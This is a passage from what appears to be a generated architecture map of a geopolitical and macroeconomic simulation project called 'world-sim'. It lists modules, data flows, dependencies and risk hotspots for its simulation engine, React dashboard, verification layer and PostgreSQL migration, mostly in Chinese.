  - {"file": "S:/world-sim/macro-sim/core/bifurcation.py:372", "area": "Global random.seed() per MC run invalidates reproducibility when agent list changes", "why": "random.seed(run_i) resets the shared Python random module before each MC run. The soul decision pipeline (base.py:310-319, faction weighted sampling) consumes random.random() calls in agents.items() iteration order. Adding, removing, or reordering agents in agents.yaml changes the consumption pattern within each seeded run, silently invalidating any previously recorded path seeds. Two macro-sim versions with different agent counts will produce different paths for the same seed even with identical initial world state."}
  - {"file": "S:/world-sim/macro-sim/core/simulation.py:549", "area": "MONTHLY_SCALE dual-hardcoded in simulation.py and calibrator.py", "why": "MONTHLY_SCALE = 0.25 appears independently at simulation.py:549 and calibrator.py:105. calibrator._extract_preclamp_delta() scales sentiment delta by its own MONTHLY_SCALE when computing calibration error targets; simulation._apply_delta() scales the live sentiment delta by its own copy. If one value is changed without the other (e.g. a developer tunes simulation dynamics), calibration computes errors against a different effective scale than the simulation produces, causing systematic calibration drift. There is a comment linking them (calibrator.py:103-105) but no runtime assertion or import."}
  - {"file": "S:/world-sim/macro-sim/core/world_state.py:372", "area": "grv_history.jsonl month deduplication keeps first entry, not latest", "why": "load_monthly_history() at line 380 uses 'if ts not in grv_monthly' to deduplicate by YYYY-MM, keeping only the first line per month. If macro-scan appends a corrected GRV record for the same month later in the file (e.g. after a data correction), the correction is silently ignored. The calibration loop trains on potentially stale GRV values for affected months."}

**备注**

  Agent count: 17 total. Financial/social/geopolitical: A1(Fed), A2(CommercialBank), A3(HedgeFund), A4(EnergyGov, suspended activation=0 — replaced by S5_saudi), A5(Institution), A6(Media), A7(EMCentralBank), A8(PBOC), A9(USTreasury), A10(Retail), A11(ECB), A12(BOJ). Sovereign: S1_usa, S2_china, S3_eu, S4_russia, S5_saudi(EnergyGovSovereignAgent). Soul files loaded for: A1(fed soul), S1_usa(A1_usa.yaml), S2_china(A2_china.yaml), S3_eu(A3_eu.yaml), A3(hedge_fund soul), A6(media soul), S4_russia, S5_saudi. Agents without soul_file fall back to legacy if-else _decide_rules.

Three-parameter calibration system (sensitivity/threshold/magnitude per agent, range 0.1-2.0) plus v3 soul faction weight paths (internal_factions.{faction}.weight) adjustable by LLM during calibration. LLM rate-limited to 1 call per 2 steps (LLM_RATE_LIMIT_STEPS=2).

Calibration error target variables (ERROR_WEIGHTS): market_sentiment(0.40), bank_credit_tightening(0.35), liquidity_premium(0.25). em_capital_outflow removed in C3-3a due to structural self-lock (clamp[0,1] + negative target unreachable). Score = 100 × weighted consistency rate (direction match fraction on T-class samples only).

Transmission matrix uses per-agent delta (not global cumulative delta) to prevent N-agent activation amplification (D1 fix at simulation.py:96). Attenuation factor 0.5 global.

v3 decision framework: ActionDecision dataclass (action/reason/evidence/faction/confidence/source) returned by decide_with_decision(). decision_trace list maintained per MacroSimModel for future result-layer persistence (v3 phase 2).

Docker deployment: single container macro-sim, mounts /vol2/1000/software/macro-scan/data as /app/macro_data (read-write), runs --daemon mode. LLM API key injected via environment variable.

### kaiyang — React/TS 前端情报面板 (开阳 Wave 2, v1.11.11)

**入口点**

  - S:/world-sim/kaiyang/src/main.tsx — Vite + React 入口
  - S:/world-sim/kaiyang/index.html — HTML 壳，加载 main.tsx
  - S:/world-sim/kaiyang/vite.config.ts — 构建配置，路径别名 @/ → src/
  - S:/world-sim/kaiyang/src/App.tsx — 根组件，三层 Provider 树 + 面板网格

**关键模块**

  - {"file": "S:/world-sim/kaiyang/src/main.tsx", "role": "Vite 入口，挂载 App 到 #root"}
  - {"file": "S:/world-sim/kaiyang/src/App.tsx", "role": "根组件：StatusProvider > ControlProvider > SelectionProvider 三层 Context 套叠；react-grid-layout 可拖拽面板网格（12 栅格，localStorage 持久化 + 健康检查 + 重置/自动布局）；ControlDrawer 覆盖层独立于网格"}
  - {"file": "S:/world-sim/kaiyang/src/panels/registry.ts", "role": "面板注册表（扩展点 #2）：14 个面板逐一登记 id/title/feed/order/visible/defaultLayout；App.tsx 从此推导初始布局，新增面板只在这里加一项"}
  - {"file": "S:/world-sim/kaiyang/src/lib/controlApi.ts", "role": "控制 API HTTP 客户端（:8900）：Bearer Token 注入（模块级单例 activeToken）、30s AbortController 超时、统一 401/HTTP 错误处理、内置 MOCK 数据（MOCK_ENABLED=false 时走真实请求）。暴露 getFetchers / rerunFetchers / pauseFetcher / resumeFetcher / updateSchedule / getOperationStatus / getAllowedSchedules"}
  - {"file": "S:/world-sim/kaiyang/src/config/controlConfig.ts", "role": "控制 API 配置：API_BASE_URL 优先级链（localStorage > VITE_CONTROL_API_BASE_URL env > 硬编码 http://192.168.31.108:8900/api/v1/control/）；MOCK_ENABLED 开关；Token 读写（env var > localStorage）；轮询参数（3s 间隔 × 30 次 = 90s 超时）"}
  - {"file": "S:/world-sim/kaiyang/src/types/control.ts", "role": "控制面板全量 TS 类型：Fetcher、FetcherListResponse、OperationStatus（accepted→queued→running→completed/failed）、ControlState/Action（useReducer 形状）、ControlContextValue"}
  - {"file": "S:/world-sim/kaiyang/src/state/ControlContext.tsx", "role": "useReducer 全局控制状态：drawerOpen / activeTab / token / pendingOps / toasts / logs / lockedFetchers。Token 变更时同步调用 setApiToken()（注入 HTTP 客户端）和 setStoredToken()（持久化）；日志变更时写 operationLog.ts"}
  - {"file": "S:/world-sim/kaiyang/src/hooks/useControlApi.ts", "role": "useFetchers() 封装：调用 getFetchers()、三态（data/loading/error）、401 时自动 setToken(null)、手动 refresh"}
  - {"file": "S:/world-sim/kaiyang/src/hooks/useOperationPolling.ts", "role": "异步操作状态轮询：对每个 pendingOp 独立 setInterval 3s 轮询 getOperationStatus；终态后自动 unlockFetcher + showToast + addLog + removePendingOp；超时（30次）同样走终态清理"}
  - {"file": "S:/world-sim/kaiyang/src/control/ControlDrawer.tsx", "role": "380px 右侧玻璃拟态抽屉：entering/entered/exiting/exited 四态 CSS 动画；Tab 路由到 TianshuTab（已实现）/ PlaceholderTab（天璇/天玑/玉衡/操作日志，建设中）；ToastContainer 悬浮通知"}
  - {"file": "S:/world-sim/kaiyang/src/control/TianshuTab.tsx", "role": "天枢采集源管理 Tab：展示 fetcher 列表、重跑/暂停/恢复/调频操作（入口，实现在 FetcherCard/FrequencySelector/ProgressCard）"}
  - {"file": "S:/world-sim/kaiyang/src/types/contracts.ts", "role": "所有上游数据契约 TS 类型：GrvRaw / GrvEvent / NewsItem / FredManifest / NuclearSite / NuclearWatchReading / NewsGeoEvent / MarketQuote / AirTrafficRaw / AirRouteRaw / SdrSummaryRaw / ThermalHotspotRaw / SpaceLaunchRaw / HealthGeoRaw / 六类风险信号 Raw / ReportMeta / FciLatestRaw 等，共 36+ 接口"}
  - {"file": "S:/world-sim/kaiyang/src/config/dataSources.ts", "role": "Feed 注册表（扩展点 #1）：18+ feed 逐一登记 name/path/type/schemaVersion/refreshMs；DATA_BASE_URL 优先级链（VITE_DATA_BASE_URL env > window.__KAIYANG_DATA_BASE_URL__ > './data/'）。新增数据源只加此处"}
  - {"file": "S:/world-sim/kaiyang/src/lib/readLayer.ts", "role": "底层 fetch 封装：同路径并发去重（inFlight Map，请求结束即释放，无持久缓存）、cache:'no-cache'、fetchText/fetchJson/fetchCsv + FRED CSV 解析器"}
  - {"file": "S:/world-sim/kaiyang/src/hooks/useFeed.ts", "role": "统一数据读取 Hook（SWR 风格）：按 feedName 从 FEEDS 取 config，经 readLayer 拉取；schema_version 校验（兼容下划线前缀）、updated/gdelt_updated 时间戳上报 StatusContext、refreshMs>0 时 setInterval 轮询"}
  - {"file": "S:/world-sim/kaiyang/src/lib/grvAdapter.ts", "role": "grv_latest.json → GrvModel 适配：映射 GRV_DIMENSIONS 定义、8% 不确定区间估算、推导维度置信度加权（conf<0.65 用 2x 不确定区间）、geographic/composite 分类、headline 选取"}
  - {"file": "S:/world-sim/kaiyang/src/lib/mapData.ts", "role": "3D+2D 地图数据构建共用层（K6 约定：渲染器只读此层预计算的 color/weight/shape/status，不反查类别定义）：buildRiskPoints / buildRiskArcs / buildEventBars / downsampleLayer；RiskPoint/RiskArc 类型定义"}
  - {"file": "S:/world-sim/kaiyang/src/components/WorldPanel.tsx", "role": "世界视图主面板：消费 10+ feeds（grv/nuclearSites/news_geo/airtraffic/airroutes/sdr/firms/spacelaunch/health_geo/market_quotes），调用 7 个 adapter 构建 allPoints，capPointsPerLayer 护栏（aircraft 豁免），图层显隐+地区过滤+聚焦联动，GlobePanel + FlatMapPanel 双视图始终挂载"}
  - {"file": "S:/world-sim/kaiyang/src/components/GlobePanel.tsx", "role": "3D 地球渲染器（globe.gl + three.js）：无官方 TS 类型全用 any；ResizeObserver + rAF 双重尺寸修正；战略要地 THREE.Sprite；Top-80 标签截断；聚焦光环（focusPointId）；能力探测降级（graticules/rings/htmlElements/customLayer 均 typeof 探测后再调用）"}
  - {"file": "S:/world-sim/kaiyang/src/state/StatusContext.tsx", "role": "全局数据状态：warnings（按 feed:field 去重）、timestamps（各 feed updated 字段）、dataVersions（schema_version 实测值）、simTrigger（推演触发）"}
  - {"file": "S:/world-sim/kaiyang/src/state/SelectionContext.tsx", "role": "跨面板聚焦共享态：两正交槽位 selectedSignalKey（信号流行选中）+ focusPointId（地图点高亮）；纯函数 selectionReducer 便于单测；news_export.json 无坐标故信号流点击不触发地图联动（设计文档明确说明）"}
  - {"file": "S:/world-sim/kaiyang/src/lib/operationLog.ts", "role": "操作日志 localStorage 持久化（readLogs/appendLog/writeLogs），上限 50 条"}
  - {"file": "S:/world-sim/kaiyang/src/config/grvDimensions.ts", "role": "GRV 维度静态定义：id/label/sourceKey（grv_latest.json 字段名）/lat/lng/group/kind/isDerived；GRV_ARCS（地缘联动弧线对）"}
  - {"file": "S:/world-sim/kaiyang/src/config/layerCategories.ts", "role": "12 类图层定义（geo/event/news/conflict/nuclear/aircraft/sdr/thermal/space/health/air/composite）：每类 color/label/shape；DEFAULT_VISIBLE_CATEGORIES；UNCAPPED_LAYERS（aircraft）；localStorage 序列化/反序列化"}
  - {"file": "S:/world-sim/kaiyang/src/lib/geoAggregate.ts", "role": "GDELT 地理新闻同城聚合：同坐标/近似地名（含拼写变体如 Beijing/Peking）合并为聚合 RiskPoint（aggCount>1）；返回 childrenByPointId 供弹框展示"}
  - {"file": "S:/world-sim/kaiyang/src/components/FlatMapPanel.tsx", "role": "2D 平面地图（SVG），与 GlobePanel 共用同一份 points/arcs/sites 数据，aircraft 层在此视图经 downsampleLayer 降采样"}

**数据流**

  "数据分两条独立流，互不相交：

【读取流（只读展示）】
DATA_BASE_URL（VITE env > window.__KAIYANG_DATA_BASE_URL__ > ./data/）
  → readLayer.ts::fetchJson/fetchCsv（in-flight 并发去重，cache:no-cache）
  → useFeed(feedName)（schema_version 校验、时间戳上报 StatusContext、refreshMs 轮询）
  → 各面板通过 useFeed 拉取各自 feed：
      grv_latest.json → adaptGrv() → GrvModel → buildRiskPoints/buildRiskArcs → WorldPanel → GlobePanel/FlatMapPanel
      news_export.json → SignalStreamPanel（直接渲染 NewsItem[]）
      news_geo.json（I60轮询）→ aggregateNewsGeo() → newsGeoPoints（聚合 RiskPoint）→ WorldPanel
      airtraffic_opensky.json → adaptAirTraffic() → airPoints
      airroutes.json → adaptAirRoutes() → airRouteArcs（弧线）
      sdr_summary.json → adaptSdr() → sdrPoints
      firms_fire.json → adaptThermal() → thermalPoints
      spacelaunch.json → adaptSpace() → spacePoints
      health_geo.json → adaptHealth() → healthPoints
      nuclear_sites.json + 静态种子 → mergeNuclear() → buildNuclearPoints()
      …以上全部 → capPointsPerLayer(aircraft豁免) → allPoints
      → 按 mode(globe/flat) 分层 → 按 region 过滤 → 按图层显隐过滤 → visiblePoints → GlobePanel/FlatMapPanel

【控制流（读写 :8900）】
ControlContext（useReducer：token/pendingOps/lockedFetchers/toasts/logs）
  Token 优先级：VITE_CONTROL_API_TOKEN env > localStorage(kaiyang_control_token)
  Token 变更时同步写入 controlApi.ts 模块变量 activeToken（Bearer Token 注入）
  TianshuTab → FetcherCard → controlApi.ts::rerunFetchers/pauseFetcher/resumeFetcher/updateSchedule
    → POST/PUT http://192.168.31.108:8900/api/v1/control/… (30s 超时)
    → RerunResponse.operation_id → addPendingOp → useOperationPolling
      → 3s 轮询 GET /operations/{id} → 终态(completed/failed) → showToast + addLog + unlockFetcher
      → operationLog.ts 持久化到 localStorage（上限50条）

【跨面板聚焦】
SignalStreamPanel 点击行 → SelectionContext.selectSignal(key, focusPointId?)
  → focusPointId 由 WorldPanel 消费 → GlobePanel.focusPointId（光环加速 + 标签置顶）
  （news_export.json 无坐标，信号流点击目前不触发地图联动，设计文档有说明）"

**外部依赖**

  - globe.gl — 3D 地球渲染（WebGL），无官方 TS 类型，全代码按 any 处理
  - three.js r0.185.1 — globe.gl 底层 WebGL 运行时，THREE.Sprite 用于战略要地符号
  - react-grid-layout — 可拖拽/缩放面板网格，localStorage 布局持久化
  - 天枢控制服务 http://192.168.31.108:8900/api/v1/control/ — fetcher 管理 REST API（Bearer Token）
  - 静态数据挂载目录 DATA_BASE_URL（./data/ 或 NAS 只读挂载）— grv_latest.json / news_export.json / news_geo.json 等 18+ JSON/CSV 文件
  - echarts（via EChart.tsx 组件）— 经济面板 / GRV 雷达图
  - Vite + TypeScript + Tailwind CSS — 构建/样式工具链

**风险热点**

  - {"file": "S:/world-sim/kaiyang/src/components/GlobePanel.tsx", "area": "globe.gl 全 any，无类型安全", "why": "第138行 globeRef 和所有 API 调用均用 any，globe.gl 方法签名（ringsData/htmlElementsData/customLayerData/onZoom 等）靠字符串能力探测。API 变更或版本升级时编译不报错，错误只在运行时暴露；cleanup 路径 world._destructor() 也是 any 调用，内存泄漏风险难以静态发现"}
  - {"file": "S:/world-sim/kaiyang/src/config/controlConfig.ts", "area": "控制 API 硬编码局域网 IP，无连接回退", "why": "第11行 DEFAULT_API_BASE_URL = 'http://192.168.31.108:8900/…'，MOCK_ENABLED 默认 false。在开发者本机以外的环境（含 CI、其他局域网、生产）所有控制 API 调用均静默失败，需要用户手动设置 localStorage 或 env var，无任何运行时提示"}
  - {"file": "S:/world-sim/kaiyang/src/lib/controlApi.ts", "area": "Bearer Token 模块级单例，无自动刷新", "why": "第167行 let activeToken 是模块单例，所有 API 调用共享同一 token。401 时 useFetchers 调用 setToken(null) 清空 token，但无重试/刷新机制，用户必须手动重新配置。在 MOCK_ENABLED=false 的生产环境下 token 失效会导致所有控制操作静默中断"}
  - {"file": "S:/world-sim/kaiyang/src/components/WorldPanel.tsx", "area": "capPointsPerLayer 截断无 UI 反馈", "why": "第116行超出 MAX_POINTS_PER_LAYER 的点位静默丢弃（仅 console.warn），用户界面上不会看到任何提示。aircraft 层豁免（UNCAPPED_LAYERS），但其他图层（如 thermal 火点、health 卫生事件）突增时数据丢失无感知"}
  - {"file": "S:/world-sim/kaiyang/src/control/ControlDrawer.tsx", "area": "关闭按钮依赖 DOM querySelector 脆弱耦合", "why": "第48行和第89行通过 document.querySelector('button[title*=\"控制台\"]') 间接触发关闭，而非直接调用 ControlContext.closeDrawer()。StatusBar 按钮 title 属性一旦重命名，backdrop 点击和关闭箭头将静默失效，抽屉无法关闭"}
  - {"file": "S:/world-sim/kaiyang/src/hooks/useOperationPolling.ts", "area": "轮询 useEffect 依赖 pendingOps 引用，可能重复注册定时器", "why": "第42行 useEffect 依赖 pendingOps 对象，每次 ControlContext 状态更新（包括 addLog/showToast 触发的渲染）都会重建 pendingOps 对象引用，可能触发旧定时器未清理就重建新定时器的竞态。pollCounts/processed ref 跨定时器实例共享，可减轻问题但不能完全消除"}
  - {"file": "S:/world-sim/kaiyang/src/lib/readLayer.ts", "area": "in-flight 去重不覆盖 refreshMs 轮询窗口", "why": "第13行 inFlight Map 在 promise resolve 后立即删除。news_geo/market_quotes 的 60s 轮询若与 React StrictMode 双挂载或多面板同时触发，inFlight 窗口可能已关闭而发出重复请求。无持久缓存意味着每次 useFeed 挂载都强制重拉，切换视图时开销集中"}
  - {"file": "S:/world-sim/kaiyang/src/App.tsx", "area": "布局健康检查仅校验 world 面板，其他 13 个面板不受保护", "why": "第87行 isLayoutHealthy 只检查 world 面板 h/w 是否合理，其他面板（如 grv/signal-stream）被拖到 h=1 的损坏状态也能通过健康检查，导致持久化损坏布局在下次加载时被认为健康直接使用"}

**备注**

  "版本：开阳 Wave 2 v1.11.11（2026-08-15 最新提交包含 health 图层）。

控制面板 Tab 现状：只有 tianshu（天枢采集源管理）完整实现，天璇/天玑/玉衡/操作日志 4 个 Tab 均为 PlaceholderTab（建设中）。

SelectionContext 双槽位设计注意：news_export.json 信号流条目无坐标（无 focusId），信号流点击只写 selectedSignalKey 不触发地图联动。待天枢 GDELT news_geo feed 补充 focusId 字段后，selectSignal 第二参传值即可自动联动，前端无需改动。

grv_latest.json 消费路径最复杂：同一 feed 被 WorldPanel / GrvPanel / RiskSummaryPanel / StatusBar / StatusMiniPanel 多处消费；readLayer.ts 的 in-flight 去重在同一挂载周期内防止重复请求，但跨周期无缓存，切 Tab 回来会重拉。

3D vs 2D 视图始终双挂载（WorldPanel.tsx 第438-467行），通过 pointer-events-none invisible 切换可见性，避免 WebGL 上下文反复创建销毁的代价。aircraft 实时航班（12503点）在 3D 球视图不渲染（用户决策：3D 无意义且耗资源），在 2D 平面视图经 downsampleLayer 降采样后渲染。

数据目录约定：天枢（Tianshu，Python 后端）负责产生并写入 DATA_BASE_URL 指向的静态 JSON/CSV 文件；开阳（kaiyang，本前端）只读消费，两者通过文件契约解耦。"

### macro-ji (天玑验证层 + 玉衡权重矩阵)

**入口点**

  - S:\world-sim\macro-ji\verify_watchdog.py:main() — 容器 CMD，3s轮询循环，T2触发链入口
  - S:\world-sim\macro-ji\tianji_verifier.py:run_monthly_verification() — watchdog 触发的验证主流程
  - S:\world-sim\macro-ji\tianji_verifier.py --confirm <PRED_ID> 0|1 — 人工确认地缘预测 CLI
  - S:\world-sim\macro-ji\weight_matrix.py --pending / --health / --init — 玉衡人工操作 CLI
  - S:\world-sim\macro-ji\tianji_db.py (直接执行) — 数据库 migration 入口

**关键模块**

  - {"file": "S:\\world-sim\\macro-ji\\tianji_verifier.py", "role": "月度验证主运行器：verify_quantitative()(FRED/GRV自动取值→Brier) + geopolitical ntfy人工确认 + check_and_generate_reweight_suggestions()(反哺建议→pending_weight_adjustments.json) + __main__ 末端挂 tianji_calibrator.run_calibration()"}
  - {"file": "S:\\world-sim\\macro-ji\\tianji_db.py", "role": "共享 SQLite DB schema 与 CRUD：8张表(predictions/reasoning_trace/weight_update_log/narrative_chunks等)；get_connection()(WAL+FK)；log_weight_update()；update_prediction_verified()；get_pending_predictions()"}
  - {"file": "S:\\world-sim\\macro-ji\\weight_matrix.py", "role": "玉衡权重矩阵：apply_weight_adjustment()(双层clip±25%变化速率+[0.05,5.0]绝对范围)；approve_adjustment()/reject_adjustment() 审批写回；run_health_check()(Herfindahl+有效信源比例)；_check_consecutive_direction()(连续4次同方向告警)"}
  - {"file": "S:\\world-sim\\macro-ji\\verify_watchdog.py", "role": "T2触发 watchdog：3s轮询 /app/macro_data/tianji_trigger.json；batch_id幂等键；processed标记；检出即 subprocess 执行 tianji_verifier.py；_mark_processed() 原子写回 last_result"}
  - {"file": "S:\\world-sim\\macro-ji\\tianji_calibrator.py", "role": "GDELT分数校准器(T2扩展)：读 gdelt_history.jsonl → 计算8维度P95 scale + tone_base + 4热点P95 → 原子写 gdelt_calib.json；天枢消费方替代硬编码基准；回滚路径：删除文件即fallback"}
  - {"file": "S:\\world-sim\\macro-ji\\optim_config.py", "role": "容器路径常量：WORKSPACE=/app; DATA_DIR=TIANJI_DATA_DIR env(default /app/macro_data)；FRED_API_KEY。显式env防止路径落镜像内空卷(P0-C同款红线修复)"}
  - {"file": "S:\\world-sim\\macro-scan\\config\\grv_weights.yaml", "role": "权重矩阵主配置(48KB)：14个信源 × 65+情景事件敏感度；slow_variables_weights(ucri/gci)；最后更新2026-07-30人工维护；玉衡审批后由apply_weight_adjustment()写回"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\observability.py", "role": "瑶光可观测性(属天枢容器非天玑)：heartbeat写入+任务计数+日终刷盘；daily_health_push()推送GRV更新时间/降级fetcher数/predictions表行数三个健康数字到ntfy；read_synthesizer_stats()读合成器统计"}
  - {"file": "S:\\world-sim\\macro-scan\\config\\causal_assumptions.md", "role": "天权因果假设文档：GRV 13维度权重来源账本+玉衡禁止调整汇总；当前状态：初稿，尚未经天玑校准；含大量[待实现]条目(GRV_T/A双层衰减/social_stress公式/middle_east WTI Channel B等)"}

**数据流**

  天枢 scheduler(09:42每日) → 写 tianji_trigger.json(tmp→rename原子写, batch_id幂等) → verify_watchdog.py(3s轮询检出未处理trigger) → subprocess: tianji_verifier.py → get_pending_predictions()(SQLite forecast_tracker.db) → [quantitative] verify_quantitative(): _fetch_fred_value(fred_history/SERIES.csv) / _fetch_grv_value(grv_history.jsonl) → _compute_brier_score() → update_prediction_verified()(SQLite写回status=verified+brier) → [geopolitical] UPDATE status=awaiting_human + ntfy推送 → check_and_generate_reweight_suggestions()(读weight_update_log; 满MIN_TRIGGER_N=8则生成建议写pending_weight_adjustments.json + ntfy) → print_accuracy_report() → [T2扩展] tianji_calibrator.run_calibration()(读gdelt_history.jsonl → 写gdelt_calib.json) → watchdog置processed=true + 写last_result。
人工操作路径(审批): weight_matrix.approve_adjustment(index) → apply_weight_adjustment()(双层clip) → 写grv_weights.yaml + log_weight_update()(SQLite weight_update_log, try/except pass包裹) → _check_consecutive_direction()告警。
天枢消费: geo_risk_vector.py读grv_weights.yaml作情景评分权重。

**外部依赖**

  - SQLite forecast_tracker.db — 宿主 /vol2/1000/software/macro-scan/data/，容器 /app/macro_data/，与天璇macro-sim共用同一inode(WAL三写者)
  - grv_weights.yaml + prior.yaml(缺失) — config卷 /vol2/1000/software/macro-scan/config/，容器 /app/config/:rw (08-06从:ro修复)
  - fred_history/*.csv — 量化验证取值，宿主 macro-scan/data/fred_history/
  - grv_history.jsonl — GRV维度历史值，宿主 macro-scan/data/
  - gdelt_history.jsonl — 天玑校准器输入，宿主 macro-scan/data/
  - tianji_trigger.json — T2共享触发文件，天枢写/天玑消费
  - ntfy.sh/***REMOVED*** — 外部推送服务(人工验证请求/权重建议/健康告警)
  - pyyaml>=6.0 — 唯一第三方依赖(requirements.txt)；缺失时_load_yaml()返回{}(静默降级)
  - FRED_API_KEY — 环境变量，当前docker-compose明文硬编码(a3f1dc8f...)

**风险热点**

  - {"file": "S:\\world-sim\\macro-ji\\tianji_verifier.py", "area": "评分→校准→权重反馈链主断路", "why": "predictions表仅1条测试数据(2026-08-01)，天璇run_scoring()未产出真实预测。MIN_TRIGGER_N=8永远未触达，check_and_generate_reweight_suggestions()从不生成建议，weight_update_log 0行。整个 Brier→BSS→反哺闭环处于持续idle状态，天玑 V1 虽健康运行但无实质数据通过。"}
  - {"file": "S:\\world-sim\\macro-ji\\weight_matrix.py", "area": "weight_update_log 从未写入 + 静默吞没", "why": "log_weight_update()调用在apply_weight_adjustment()第176-187行被try/except: pass包裹——yaml写入失败或DB不可用时日志静默丢失，无任何告警。此外reject_adjustment()中同样有try/except: pass。当前0行既因无真实审批，也因此隐患：即使未来产生审批，日志失败不可感知。"}
  - {"file": "S:\\world-sim\\macro-scan\\config\\grv_weights.yaml", "area": "缺失 baseline_snapshot → Herfindahl集中度检查实际失效", "why": "文件由2026-07-30人工审计生成，非init_weights_from_prior()路径，无baseline_snapshot字段。run_health_check()读data.get('baseline_snapshot', {})得空dict；base = baseline.get(tgt, herf)恒返回herf自身；ratio永远1.0，'过度集中'告警永远不触发，权重矩阵向单一信源集中的风险被系统性掩盖。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\observability.py", "area": "瑶光健康推送架构错位：PG路径 vs 天玑SQLite", "why": "daily_health_push()经pg_read模块查询PG schema tianji.predictions（第302-309行），而天玑实际使用SQLite forecast_tracker.db。PG连接不可用时predictions_rows=-1，推送显示'DB不存在'而非真实SQLite 1行；PG可用但schema未同步时显示0行触发误报'数据链断路'。健康监控无法真实反映天玑的运行状态。"}
  - {"file": "S:\\world-sim\\macro-scan\\config\\grv_weights.yaml", "area": "YAML结构问题：slow_variables_weights.gci 意外包含65+情景事件权重", "why": "第1228-1295行：gci条目（属slow_variables_weights节）之下挂载了65+中文情景事件敏感度权重，与weights节下各信源条目的结构相同但路径不同。_read_current_weight(source_id='gci', target_type=...)读weights节，找不到gci，返回默认值0.20，导致这批权重在反哺建议计算中完全被忽略。"}
  - {"file": "S:\\world-sim\\macro-ji\\tianji_verifier.py", "area": "verify_quantitative无阈值方向预测 → outcome=0.5污染Brier", "why": "第183行：direction不在up/down/above/below时outcome硬设0.5。此时Brier=(prob-0.5)^2对高置信度预测（如prob=0.9）给出0.16的高惩罚，但实际上只是'无法判断'而非真实错误。污染BSS计算和MIN_TRIGGER_N=8后的反哺触发条件。"}
  - {"file": "S:\\world-sim\\macro-ji\\docker-compose.yml", "area": "FRED_API_KEY明文写入compose文件", "why": "第16行：FRED_API_KEY=<FRED_KEY_REDACTED>明文硬编码，随仓库存储。"}
  - {"file": "S:\\world-sim\\macro-scan\\config\\causal_assumptions.md", "area": "天权文档：所有权重为经验假设，大量[待实现]组件未落地", "why": "状态'初稿，尚未经天玑校准'。GRV_T/A双层衰减架构(§14)、social_stress三成分公式(§11)、middle_east_energy WTI Channel B(§5目标权重)、cultural_friction Hofstede/WVS参数化(§12)、WUI指数接入(§3/6)均仅文档化未实现。当前所有混合权重（GDELT×0.4+GPR×0.6等）标注[经验假设]，天玑V2启动前无实证依据。"}

**备注**

  【weight_update_log 是否从未写入】确认：0行。原因双重：(1)正常——无真实人工审批发生(MIN_TRIGGER_N=8未触达，无pending建议产生)；(2)代码隐患——apply_weight_adjustment()中log_weight_update()被try/except:pass包裹，未来审批时失败也不可感知。

【未上线组件就绪度】tianji_calibrator.py代码完整已挂载T2末端，无gdelt_history时安全退化(就绪，等数据)。GRV_T/A双层衰减、social_stress三成分、middle_east WTI Channel B、cultural_friction Hofstede/WVS参数化均仅文档化，代码层零实现(未就绪)。prior.yaml在仓库中完全缺失，init_weights_from_prior()不可用。

【天权(causal_assumptions.md)现状】初稿，2026-08-06最后更新，含完整文献引用和玉衡禁止调整汇总(§16)，价值在于RCA起点作用；但所有权重数值均标注[经验假设]或[待实现]，无实际Brier校准结论写入。

【瑶光(observability.py)现状】运行在天枢容器(macro-scan/核心代码/)，非天玑容器；功能完整(心跳/任务计数/日终刷盘/三数字健康推送)；架构错位问题(PG vs SQLite)导致predictions行数监控不可信。天玑容器内没有任何observability代码，容器自身运行状态仅靠healthcheck(import三个模块)和watchdog日志反映。

### world-sim 数据层 (E0-C SQLite→PostgreSQL 迁移后)

**入口点**

  - pg_read.connect() — 所有消费模块 PG 只读入口
  - pg_read.exec_read(sql, params) — 便捷只读，失败返回 []
  - pg_write_collection.upsert_news_scan_context / upsert_news_article / upsert_synthesis_log / upsert_forecast / upsert_tianji_prediction 等 — 所有 PG 写入口
  - news_db.write_scan_context(db_path, ...) — 新闻扫描快照写入（双写）
  - news_db.insert_articles(db_path, articles, ingest_ctx_id) — 文章入库（双写）
  - forecast_tracker.ForecastTracker().log_forecast(...) — 预测写入（双写）
  - tianji_db.save_prediction(pred) — 天际预测存档（双写）
  - signal_synthesizer.run_synthesizer(db_path, grv_path) — 触发合成器写 synthesis_log
  - scan_weak_signals.run_scan() — 主扫描流程入口（orchestrates all fetchers + synthesizer）
  - reconcile_synthesis.main() — synthesis_log 缺口补填
  - silent_failure_probe.run_probe(alert) — 监控探针（被 scheduler 和 final_acceptance_e0c 调用）
  - verify_reads_e0c.main() — P2 双读回归校验
  - b0_migrate.main() --all — B0 批量迁移（一次性）
  - final_acceptance_e0c.py — E0-C 全量验收（只读）

**关键模块**

  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\pg_read.py", "role": "E0-C 只读层：pg_read.connect() 返回 _Row 工厂连接；_norm() 将 PG timestamptz/Decimal/bool/bytes 归一化为 SQLite 等价文本类型；exec_read() 便捷只读查询（失败返回 []）；smoke_test() 检查 news 三表行数。所有消费模块的 PG 读入口。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\pg_write_collection.py", "role": "E0-A 旁路双写层：upsert_news_*/upsert_forecast_*/upsert_tianji_* 系列函数写入 PG；C3 硬化：连接缓存复用、有界重试退避、失败计数告警；upsert_synthesis_log + update_synthesis_log_success 在 P3 后加入；_next_id() 为无 caller-id 的 BIGSERIAL 表续 id。绝不向上抛异常。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\news_db.py", "role": "news.db 主写层（SQLite WAL）：scan_contexts/articles/article_categories/signal_episodes/episode_articles/synthesis_log。模块级 _PG_ONLY = WORLDSIM_SQLITE_OFF==1；PG-only 分支直调 pg_write_collection._next_id()+upsert；_conn() 在 PG-only 时 raise RuntimeError 防止 SQLite 复生（08-14 P0 修复）。get_trigger_titles() 直接走 pg_read。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\forecast_tracker.py", "role": "forecast_tracker.db 主写层（forecasts/actuals/evaluations）：_PG_ONLY 模块级标志；PG-only 时 _connect() 返回 _NoopConn 桩（所有写语句空操作）；_pg_fetch/_pg_fetchone 只读辅助函数走 pg_read；E0-A 双写靠 pg_write_collection upsert_forecast 等函数。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\tianji_db.py", "role": "forecast_tracker.db 天际表层（predictions/reasoning_trace/weight_update_log/narrative_chunks/narrative_density_flags）：与 forecast_tracker.py 共享同一 SQLite 文件；_PG_ONLY 标志 + _NoopConn 同款设计；E0-A 双写靠 pg_write_collection upsert_tianji_* 函数。"}
